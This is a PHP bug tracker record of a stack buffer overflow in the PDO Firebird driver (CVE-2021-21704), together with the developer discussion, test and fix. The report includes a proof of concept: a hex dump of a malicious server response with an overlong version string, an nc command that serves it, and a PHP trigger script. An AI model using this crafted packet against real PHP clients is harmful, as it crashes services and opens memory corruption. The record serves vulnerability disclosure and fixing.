| | [Sec Bug](bug.php?id=76448) #76448 | Stack buffer overflow in firebird\_info\_cb | | | | | | --- | --- | --- | --- | --- | --- | | Submitted: | 2018-06-11 19:34 UTC | Modified: | 2021-06-28 04:40 UTC |  | | From: | trichimtrich at gmail dot com | Assigned: | [stas](search.php?cmd=display&assign=stas) ([profile](https://people.php.net/stas)) | | Status: | Closed | Package: | [PDO Firebird](search.php?cmd=display&package_name[]=PDO+Firebird) | | PHP Version: | 7.3.0alpha1 | OS: |  | | Private report: | No | CVE-ID: | [2021-21704](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21704) |   View [Developer](bug.php?id=76448&edit=1) [Edit](bug.php?id=76448&edit=2)   **[2018-06-11 19:34 UTC] trichimtrich at gmail dot com** ``` Description: ------------ A bug in pdo_firebase module allows a malicious firebase server or man-in-the-middle attacker to crash PHP. Using strcat in firebird_info_cb without checking the length of server version string in response packet, causes stack buffer overflow. Vulnerable code at:  \php-src\ext\pdo_firebird\firebird_driver.c   506   if (arg) {   507       if (*(char*)arg) { /* second call */   508:          strcat(arg, " ");   509       }   510:      strcat(arg, s);   511   }   512  }  The buffer is defined in: \php-src\ext\pdo_firebird\firebird_handle_get_attribute:521 		char tmp[512];   $ ./php --version PHP 7.3.0-dev (cli) (built: Jun  9 2018 04:47:18) ( NTS ) Copyright (c) 1997-2018 The PHP Group Zend Engine v3.3.0-dev, Copyright (c) 1998-2018 Zend Technologies  Test script: --------------- $ xxd crash_ver.bin 00000000: 0000 005e ffff 800f 0000 0001 0000 0005  ...^............ 00000010: 0000 0000 0000 000b 4c65 6761 6379 5f41  ........Legacy_A 00000020: 7574 6800 0000 0000 0000 0000 0000 005c  uth............\ 00000030: 0000 0000 0000 000b 4c65 6761 6379 5f41  ........Legacy_A 00000040: 7574 6800 0000 0000 0000 0000 0000 0009  uth............. 00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 00000060: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 00000070: 0000 0000 0000 0000 0000 0000 0000 0100  ................ 00000080: 0200 0000 0000 0000 0000 0000 0000 0000  ................ 00000090: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 000000b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 000000c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 000000d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 000000e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 000000f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 00000100: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 00000110: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 00000120: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 00000130: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 00000140: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 00000150: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 00000160: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 00000170: 0000 0000 0000 0000 0000 0000 0000 0000  ................ 00000180: 0000 0001 0000 0000 0000 0000 0000 0009  ................ 00000190: 0000 0000 0000 0000 0000 0000 0000 0140  ...............@ 000001a0: 6724 0102 2257 492d 5434 2e30 2e30 2e39  g$.."WI-T4.0.0.9 000001b0: 3938 2046 6972 6562 6972 6420 342e 3020  98 Firebird 4.0 000001c0: 416c 7068 6120 31ff 5749 2d54 342e 302e  Alpha 1.WI-T4.0. 000001d0: 302e 3939 3820 4669 7265 6269 7264 2034  0.998 Firebird 4 000001e0: 2e30 2041 6c70 6861 2031 2f61 6161 6161  .0 Alpha 1/aaaaa 000001f0: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa 00000200: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa 00000210: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa 00000220: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa 00000230: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa 00000240: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa 00000250: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa 00000260: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa 00000270: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa 00000280: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa 00000290: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa 000002a0: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa 000002b0: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa 000002c0: 6161 6161 6161 610b 0500 0244 0144 0472  aaaaaaa....D.D.r 000002d0: 0d00 0201 0000 0001 0001 0000 0004 0101  ................ 000002e0: 0000 0001 0000 0000 0000 0000            ............   $ nc -lvp 3050 < crash_ver.bin  $ cat fire_version.php <?php $dsn = 'firebird:dbname=localhost:employee;charset=utf8;'; $username = 'SYSDBA'; $password = 'masterkey';  $dbh = new PDO($dsn, $username, $password, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]); echo $dbh->getAttribute(PDO::ATTR_SERVER_INFO); ?>  Expected result: ---------------- No crash  Actual result: -------------- $ ./php fire_version.php ================================================================= ==5090==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fff128ea8a0 at pc 0x0000004cf3b3 bp 0x7fff128ea190 sp 0x7fff128e9918 WRITE of size 365 at 0x7fff128ea8a0 thread T0     #0 0x4cf3b2 in __interceptor_strcat /scratch/llvm/clang-4/xenial/final/llvm.src/projects/compiler-rt/lib/asan/asan_interceptors.cc:489:5     #1 0x7f4c4a944d25  (/opt/firebird/lib/libfbclient.so.2+0x70d25)     #2 0x7f4c4a94032c  (/opt/firebird/lib/libfbclient.so.2+0x6c32c)     #3 0x7f4c4a9474cf  (/opt/firebird/lib/libfbclient.so.2+0x734cf)     #4 0x7f4c4a9432fa in isc_version (/opt/firebird/lib/libfbclient.so.2+0x6f2fa)     #5 0xcda83b in firebird_handle_get_attribute (/mnt/hgfs/share/htdocs/php3+0xcda83b)     #6 0xcbf2df in zim_PDO_getAttribute (/mnt/hgfs/share/htdocs/php3+0xcbf2df)     #7 0x12e2d9f in ZEND_DO_FCALL_SPEC_RETVAL_USED_HANDLER (/mnt/hgfs/share/htdocs/php3+0x12e2d9f)     #8 0x1212bcf in execute_ex (/mnt/hgfs/share/htdocs/php3+0x1212bcf)     #9 0x121320b in zend_execute (/mnt/hgfs/share/htdocs/php3+0x121320b)     #10 0x11175c0 in zend_execute_scripts (/mnt/hgfs/share/htdocs/php3+0x11175c0)     #11 0xfa4878 in php_execute_script (/mnt/hgfs/share/htdocs/php3+0xfa4878)     #12 0x1412cc4 in do_cli (/mnt/hgfs/share/htdocs/php3+0x1412cc4)     #13 0x1410e67 in main (/mnt/hgfs/share/htdocs/php3+0x1410e67)     #14 0x7f4c4961682f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)     #15 0x43d878 in _start (/mnt/hgfs/share/htdocs/php3+0x43d878)  Address 0x7fff128ea8a0 is located in stack of thread T0 at offset 544 in frame     #0 0xcda73f in firebird_handle_get_attribute (/mnt/hgfs/share/htdocs/php3+0xcda73f)    This frame has 1 object(s):     [32, 544) 'tmp' <== Memory access at offset 544 overflows this variable HINT: this may be a false positive if your program uses some custom stack unwind mechanism or swapcontext       (longjmp and C++ exceptions *are* supported) SUMMARY: AddressSanitizer: stack-buffer-overflow /scratch/llvm/clang-4/xenial/final/llvm.src/projects/compiler-rt/lib/asan/asan_interceptors.cc:489:5 in __interceptor_strcat Shadow bytes around the buggy address:   0x1000625154c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x1000625154d0: f1 f1 f1 f1 00 00 00 00 00 00 00 00 00 00 00 00   0x1000625154e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x1000625154f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x100062515500: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x100062515510: 00 00 00 00[f3]f3 f3 f3 f3 f3 f3 f3 00 00 00 00   0x100062515520: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1   0x100062515530: 00 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00   0x100062515540: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x100062515550: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   0x100062515560: 00 00 00 00 f1 f1 f1 f1 00 00 00 f3 f3 f3 f3 f3 Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:       fa   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb ==5090==ABORTING   ``` PatchesPull RequestsHistoryAllCommentsChangesGit/SVN commitsRelated reports  **[2018-06-11 20:06 UTC] [stas@php.net](//people.php.net/stas)** -Assigned To: +Assigned To: lwe **[2018-06-28 08:30 UTC] trichimtrich at gmail dot com** ``` any update for this one?  ``` **[2018-07-04 07:30 UTC] [ab@php.net](//people.php.net/ab)** ``` @trichimtrich would it be possible to get rid of the binary data in these reports? It is bad for testability as it's likely to be not portable between different DB versions or platforms. Usual SQL or whatever should be used to create the test data.  Thanks.  ``` **[2018-07-05 13:44 UTC] trichimtrich at gmail dot com** ``` PHP is crashed because the server uses abnormal info in the response packet (or mitm attacker modifies it).  The binary data in the report was captured using wireshark, produces all the info in the connection between server and client: - Handshake - Authenticate - The response of Get_Atribute(Server_Info) query, that causes crashed  I compiled a malicious version of firebird server, returns a longer version string:  <https://github.com/FirebirdSQL/firebird/blob/master/src/remote/remote.cpp#L1310>  void rem_port::versionInfo(Firebird::string& version) const { 	version.printf("%s/%s", FB_VERSION, port_version->str_data); #ifndef WIRE_COMPRESS_SUPPORT 	if (port_crypt_plugin) 		version += ":C";  ``` **[2018-07-05 20:37 UTC] [ab@php.net](//people.php.net/ab)** ``` Yeah, I see what the backtrace reveals. The buffer overflow happens in "isc_version" because an insufficient buffer was passed in this case. I was more talking about the testability, as there are several other bug reports including cases based on the binary data.  It not only regards to the binary data, but also to the tools introduced like xxd and nc. They are likely to be not present by default on every install and/or every platform. We could mimic that by using the pure binary data and creating a socket server that delivers it.  However, I also see that fe. in this particular case you've used some Firebird 4.0 alpha for the binary data creation. It is of course expected to be stable with theprotocol, but imagine that protocol would change. It would mean we couldn't ensure the testability of the code anymore. Or one would have to create a similar patch to the server and produce new binary data :/  It would be not that sensible in the case of this particular ticket, as a fix would only require to ensure the buffer is not overflown, so perhaps it could be even fixed without a test. But with an arbitrary case - a reliable test is always required. The tests are usually done with a server without malicious patches provided by mainstream or distributions.  To sum up -  - please think that every issue needs to be tested reliably in long term - preferable were a way based on SQL - a reproducer should not depend on platform specific tools (except the issue is platform specific) or tools that require extra installation  With this concrete case, I can confirm that your binary data cause a buffer overflow around firebird_driver.c:520 in tmp. Please check the other tickets for the purpose to make the testability easier and more portable.  Thanks.  ``` **[2021-03-31 12:26 UTC] [cmb@php.net](//people.php.net/cmb)** -Assigned To: lwe +Assigned To: stas **[2021-03-31 12:26 UTC] [cmb@php.net](//people.php.net/cmb)** ``` I fully agree that regression tests are important, but such stuff is inherently hard to test, and IMO it is better to have a fix without accompanying test than to have no fix.  Stas, what do you think about <<https://gist.github.com/cmb69/cf5e3162c68cb999da4572e2ab72d5dc>>?  ``` **[2021-04-06 00:34 UTC] [stas@php.net](//people.php.net/stas)** -CVE-ID: +CVE-ID: needed **[2021-04-06 00:34 UTC] [stas@php.net](//people.php.net/stas)** ``` Looks ok to me, though I can't really test it...  Stack buffer overflow in external communication protocol looks pretty bad security-wise.  ``` **[2021-04-29 13:30 UTC] [cmb@php.net](//people.php.net/cmb)** ``` To be able to test it, one would have to compile a patched version of Firebird, or to set up a fake Firebird server.  The latter is likely a lot of work, and the former would not be viable for automated testing.  Given that PDO_Firebird isn't the best maintained extension anyway, I think the best we can do is add a test to verify that the length of the return value is smaller than the buffer size. I've updated the patch accordingly: <<https://gist.github.com/cmb69/cf5e3162c68cb999da4572e2ab72d5dc>>  ``` **[2021-04-29 13:49 UTC] [cmb@php.net](//people.php.net/cmb)** ``` > The latter is likely a lot of work, […]  Nonsense, disregard.  I'm working on a proper test against a fake server.  ``` **[2021-05-05 11:47 UTC] [cmb@php.net](//people.php.net/cmb)** ``` Suggested patch: <<https://gist.github.com/cmb69/51a5818efda86f39a5afdd93caf31e8e>>.  This requires the payload server[1], and is developed against PHP-7.4.  For PHP-7.3 at least some adjustments need to be done. I can do that, but first would like to confirm that the patch and the testing "framework" are generally acceptable.  Stas, what do you think?  [1] <<https://github.com/php/php-src/pull/6940>>  ``` **[2021-06-21 05:02 UTC] [stas@php.net](//people.php.net/stas)** -CVE-ID: needed +CVE-ID: 2021-21704 **[2021-06-21 06:22 UTC] [stas@php.net](//people.php.net/stas)** -Private report: No +Private report: Yes **[2021-06-28 04:41 UTC] [git@php.net](//people.php.net/git)** ``` Automatic comment on behalf of cmb69 (author) and smalyshev (committer) Revision: <https://github.com/php/php-src/commit/67afa32541ebc4abbf633cb1e7e879b2fbb616ad> Log: Fix #76448: Stack buffer overflow in firebird_info_cb  ``` **[2021-06-28 04:41 UTC] [git@php.net](//people.php.net/git)** -Status: Assigned +Status: Closed |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

|  | |
| --- | --- |
| [PHP](https://php.net/) [Copyright © 2001-2025 The PHP Group](https://php.net/copyright.php) All rights reserved. | Last updated: Wed Jan 15 09:01:28 2025 UTC |


